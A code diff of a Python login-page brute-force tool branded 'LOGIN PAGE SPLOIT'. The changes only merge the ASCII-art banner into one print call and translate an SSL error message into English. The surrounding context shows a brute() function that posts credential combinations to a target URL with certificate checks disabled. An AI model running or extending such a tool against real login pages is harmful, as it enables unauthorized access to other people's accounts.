@@ -1,17 +1,11 @@
 import requests
 import sys
 
-line1 = "__        _______ ____"
-line2 = "\ \      / /  ___/ ___| YOUR"
-line3 = " \ \ /\ / /| |_  \___ \ LOGIN"
-line4 = "  \ V  V / |  _|  ___) |PAGE"
-line5 = "   \_/\_/  |_|   |____/ SPLOIT"
-
-print(line1)
-print(line2)
-print(line3)
-print(line4)
-print(line5)
+print("""__        _______ ____
+\ \      / /  ___/ ___| YOUR
+ \ \ /\ / /| |_  \___ \ LOGIN
+  \ V  V / |  _|  ___) |PAGE
+   \_/\_/  |_|   |____/ SPLOIT""")
 
 usage = input("Show URL usage? y/n: ")
 if usage.lower() == "y":
@@ -47,7 +41,7 @@ def brute(username, password, combinations_tested, total_combinations):
         a = requests.post(url, data=data, headers=headers, verify=False)
         r_content = a.content.lower()
     except requests.exceptions.SSLError as e:
-        print("Erro de SSL:", e)
+        print("SSL error:", e)
         sys.exit(1)
     combinations_tested += 1
     sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
